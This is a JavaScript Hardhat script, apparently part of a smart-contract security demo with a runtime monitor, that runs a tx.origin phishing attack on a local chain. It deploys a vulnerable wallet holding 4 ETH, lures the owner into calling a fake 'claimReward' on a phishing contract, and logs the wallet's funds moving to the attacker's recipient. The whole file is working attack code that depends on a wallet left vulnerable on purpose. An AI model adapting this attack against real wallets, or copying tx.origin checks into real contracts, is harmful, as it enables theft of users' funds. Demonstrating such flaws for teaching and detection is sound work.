import { network } from "hardhat";

/**
 * Live on-chain tx.origin phishing attack against TxOriginWallet.sol.
 *
 * Story: `owner` deploys the wallet and funds it. A malicious contract tricks the owner
 * into calling it (e.g. by disguising itself as something innocuous); that malicious
 * contract then calls back into the wallet's withdraw(), and because the wallet checks
 * tx.origin (the original signer) instead of msg.sender (the immediate caller), the
 * check passes even though the wallet itself didn't choose to call withdraw().
 *
 * Usage: npx hardhat run scripts/attack-txorigin.js
 */
async function main() {
  const { ethers } = await network.create("localhost");
  const [, owner, attackerDeployer, recipient] = await ethers.getSigners();

  const Wallet = await ethers.getContractFactory("TxOriginWallet", owner);
  const wallet = await Wallet.deploy({ value: ethers.parseEther("4") });
  await wallet.waitForDeployment();
  const walletAddress = await wallet.getAddress();
  console.log("TxOriginWallet deployed at:", walletAddress, "- funded with 4 ETH by its real owner");
  console.log(">>> Register this address in the dashboard now if you want it on the Runtime Monitor.\n");

  const Phish = await ethers.getContractFactory("TxOriginPhisher", attackerDeployer);
  const phisher = await Phish.deploy(walletAddress, recipient.address);
  await phisher.waitForDeployment();
  console.log("Phishing contract deployed at:", await phisher.getAddress());

  const balanceBefore = await ethers.provider.getBalance(walletAddress);

  // The owner is tricked into sending a normal-looking transaction to the phishing
  // contract (e.g. "claim your airdrop"). tx.origin is still `owner` the whole way down.
  console.log("Owner is tricked into calling the phishing contract...");
  const tx = await phisher.connect(owner).claimReward();
  const receipt = await tx.wait();

  const balanceAfter = await ethers.provider.getBalance(walletAddress);
  const recipientBalance = await ethers.provider.getBalance(recipient.address);

  console.log("\n=== RESULT ===");
  console.log("Tx mined in block", receipt.blockNumber);
  console.log("Wallet balance before:", ethers.formatEther(balanceBefore), "ETH");
  console.log("Wallet balance after: ", ethers.formatEther(balanceAfter), "ETH");
  console.log("Funds now sitting with attacker's recipient:", ethers.formatEther(recipientBalance), "ETH");
  console.log("The real owner never called withdraw() directly - tx.origin let the phisher through.");
  console.log("================\n");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
